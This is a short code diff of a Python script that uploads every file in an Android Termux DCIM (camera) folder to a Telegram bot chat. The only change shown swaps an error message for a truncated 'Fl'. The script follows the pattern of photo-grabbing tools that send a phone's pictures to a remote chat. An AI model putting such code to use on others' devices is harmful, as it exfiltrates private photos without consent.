@@ -13,7 +13,7 @@ def send_files_in_folder(bot_token, chat_id, folder_path):
                 with open(file_path, 'rb') as file_data:
                     bot.send_document(chat_id=chat_id, document=file_data)
             except TelegramError as e:
-                print(f"Failed to send {file}: {e}")
+                print(f"Fl")
 
 if __name__ == "__main__":
     path_to_folder = '/data/data/com.termux/files/home/storage/dcim'
